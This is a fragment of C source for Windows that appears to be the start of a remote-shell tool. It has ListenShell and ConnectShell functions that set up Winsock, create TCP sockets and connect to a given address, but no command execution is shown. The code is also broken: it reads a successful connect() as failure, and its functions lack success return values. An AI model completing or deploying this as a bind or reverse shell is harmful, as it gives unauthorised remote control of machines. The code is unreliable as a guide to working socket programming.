#include "RemoteShell.h"

int initialization()
{
    WSADATA wsadata;

    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
    {
        printf("[-] WSAStartup failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return 0;
    }
}

int ListenShell(char *path, SOCKADDR_IN sockaddr)
{
    SOCKET sock = NULL;
    
    if (initialization() == 0)
    {
        return 0;
    }

    sock = socket(sockaddr.sin_family, SOCK_STREAM, IPPROTO_TCP);

    if (sock == INVALID_SOCKET)
    {
        printf("[-] Create socket failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return 0;
    }
}

int ConnectShell(char *path, SOCKADDR_IN sockaddr)
{
    SOCKET sock = NULL;
    
    if (initialization() == 0)
    {
        return 0;
    }

    sock = socket(sockaddr.sin_family, SOCK_STREAM, IPPROTO_TCP);

    if (sock == INVALID_SOCKET)
    {
        printf("[-] Create socket failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return 0;
    }

    if (connect(sock, (const struct sockaddr *)&sockaddr, sizeof(sockaddr)) == 0)
    {
        printf("[-] %s:%d Connect failed!\n", inet_ntoa(sockaddr.sin_addr), htons(sockaddr.sin_port));
        printf("[+] GetLastError : %d\n", GetLastError());
        return 0;
    }
}